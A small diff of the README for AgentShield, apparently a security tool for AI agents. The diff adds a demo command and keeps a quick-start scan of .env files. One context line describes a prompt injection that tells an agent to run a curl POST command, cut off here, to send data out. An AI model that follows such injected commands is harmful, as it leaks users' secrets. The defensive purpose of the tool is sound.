@@ -1,4 +1,4 @@
-﻿<div align="center">
+<div align="center">
 
 <img src="assets/logo.png" alt="AgentShield Logo" width="130" />
 
@@ -69,6 +69,9 @@ When an untrusted prompt injection instructs an agent to run `curl -X POST https
 No account or complicated daemon required. Run instantly with `npx`:
 
 ```bash
+# 0. Watch AgentShield block .env theft & obfuscation in 10 seconds
+npx @ritualdev-lab/agentshield demo
+
 # 1. Audit any directory or config file for credentials
 npx @ritualdev-lab/agentshield scan .env
 
